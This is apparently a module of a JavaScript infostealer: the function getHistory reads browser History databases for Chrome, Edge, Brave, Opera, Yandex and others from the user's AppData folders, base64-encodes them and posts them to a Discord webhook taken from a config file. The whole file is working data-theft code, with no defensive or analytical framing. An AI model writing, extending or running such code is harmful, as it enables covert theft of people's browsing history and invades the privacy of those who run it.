const https = require("https");
const { MessageBuilder } = require("discord-webhook-node");
const fs = require("fs");
const hook = require("..");
const { webhook } = require("../manager/config");

function getHistory() {
  const tableName = "urls";
  const filePath =
    "C:\\Users\\Manoj K\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
  const local = process.env.localappdata,
    roaming = process.env.appdata,
    dbPaths = [
      `${roaming}/Opera Software/Opera Stable/History`,
      `${roaming}/Opera Software/Opera GX Stable/History`,
      `${local}/Torch/User Data/Default/History`,
      `${local}/Google/Chrome SxS/User Data/Default/History`,
      `${local}/Google/Chrome/User Data/Default/History`,
      `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
      `${local}/Microsoft/Edge/User Data/Default/History`,
      `${local}/Yandex/YandexBrowser/User Data/Default/History`,
      `${local}/Opera Software/Opera Neon/User Data/Default/History`,
      `${local}/BraveSoftware/Brave-Browser/User Data/Default/History`,
    ];

  let files = [];
  dbPaths.forEach((path) => {
    fs.access(path, fs.constants.F_OK, (err) => {
      if (err) {
        console.log(`❌`, path);
      } else {
        console.log(`✅`, path);
        files.push(path);
        fs.readFile(path, (err, data) => {
          if (err) {
            console.log(err)
            return;
          }
  
          const payload = JSON.stringify({
            attachments: [
              {
                name: "file.txt",
                content: data.toString("base64"),
              },
            ],
          });
  
          const requestOptions = {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
          };
  
          const req = https.request(webhook, requestOptions, (res) => {
            let responseData = "";
  
            res.on("data", (chunk) => {
              responseData += chunk;
            });
  
            res.on("end", () => {
              if (res.statusCode === 204) {
                resolve("File sent to Discord successfully.");
              } else {
                console.log(`Error sending file to Discord: ${responseData}`);
              }
            });
          });
  
          req.on("error", (error) => {
            console.log(`HTTP request error: ${error}`);
          });
  
          req.write(payload);
          req.end();
        });
      }
    });
  });
  console.log(files)
}
module.exports = { getHistory };
